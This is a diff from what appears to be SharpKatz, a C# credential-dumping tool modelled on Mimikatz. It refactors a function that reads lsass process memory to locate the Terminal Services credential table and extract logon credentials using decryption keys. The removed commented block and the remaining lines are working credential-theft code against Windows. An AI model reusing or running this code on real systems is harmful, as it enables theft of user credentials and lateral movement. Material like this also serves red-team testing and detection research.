@@ -74,49 +74,15 @@ namespace SharpKatz.Module
         public static unsafe int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             RTL_AVL_TABLE entry;
-            long tsGlobalCredTableSignOffset, tsGlobalCredTableOffset;
             IntPtr tsGlobalCredTableAddr;
-            IntPtr tspkgLocal;
             IntPtr llCurrent;
-            /*
-            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
-            tspkgLocal = Natives.LoadLibrary("tspkg.dll");
-            if (tspkgLocal == IntPtr.Zero)
-            {
-                Console.WriteLine("[x] Tspkg Error: Could not load tspkg.dll into local process");
-                return 1;
-            }
-            //Console.WriteLine("[*] Tspkg  Loaded tspkg.dll at address {0:X}", tspkgLocal.ToInt64());
 
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(tspkgLocal, tmpbytes, 0, (int)max_search_size);
-
-            // Search for SspCredentialList signature within tspkg.dll and grab the offset
-            tsGlobalCredTableSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.TSGlobalCredTableSign);
-            if (tsGlobalCredTableSignOffset == 0)
-            {
-                Console.WriteLine("[x] Tspkg  Error: Could not find TSGlobalCredTable signature\n");
-                return 1;
-            }
-            //Console.WriteLine("[*] Tspkg  TSGlobalCredTable offset found as {0}", tsGlobalCredTableSignOffset);
-
-            // Read memory offset to TSGlobalCredTable from a "LEA RCX,[TSGlobalCredTable]"  asm
-            IntPtr tmp_p = IntPtr.Add(tspkgMem, (int)tsGlobalCredTableSignOffset + oshelper.TSGlobalCredTableOffset);
-            byte[] tsGlobalCredTableOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
-            tsGlobalCredTableOffset = BitConverter.ToInt32(tsGlobalCredTableOffsetBytes, 0);
-
-            // Read pointer at address to get the true memory location of TSGlobalCredTable
-            tmp_p = IntPtr.Add(tspkgMem, (int)tsGlobalCredTableSignOffset + oshelper.TSGlobalCredTableOffset + sizeof(int) + (int)tsGlobalCredTableOffset);
-            byte[] tsGlobalCredTableAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            tsGlobalCredTableAddr = new IntPtr(BitConverter.ToInt64(tsGlobalCredTableAddrBytes, 0));
-            */
             tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, "tspkg.dll", max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);
 
             //Console.WriteLine("[*] Tspkg TSGlobalCredTable found at address {0:X}", tsGlobalCredTableAddr.ToInt64());
 
             if (tsGlobalCredTableAddr != IntPtr.Zero)
             {
-                // Read first entry from linked list
                 byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
                 entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
